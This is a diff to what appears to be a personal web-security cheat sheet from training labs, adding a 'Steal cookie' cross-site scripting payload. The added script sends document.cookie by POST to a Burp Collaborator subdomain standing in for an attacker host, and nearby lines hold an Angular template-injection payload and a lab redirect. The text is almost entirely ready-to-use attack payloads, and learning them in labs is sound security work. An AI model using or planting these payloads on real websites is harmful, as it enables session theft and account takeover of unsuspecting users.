@@ -434,7 +434,16 @@ document.location="http://stock.0a8d0004030bc63982c358ab00f600d7.web-security-ac
 ```
 Note - encode < to not have errors
 ###XSS
-
+#Steal cookie
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
 #Angular
 `{{constructor.constructor('alert(1)')()}}`
 
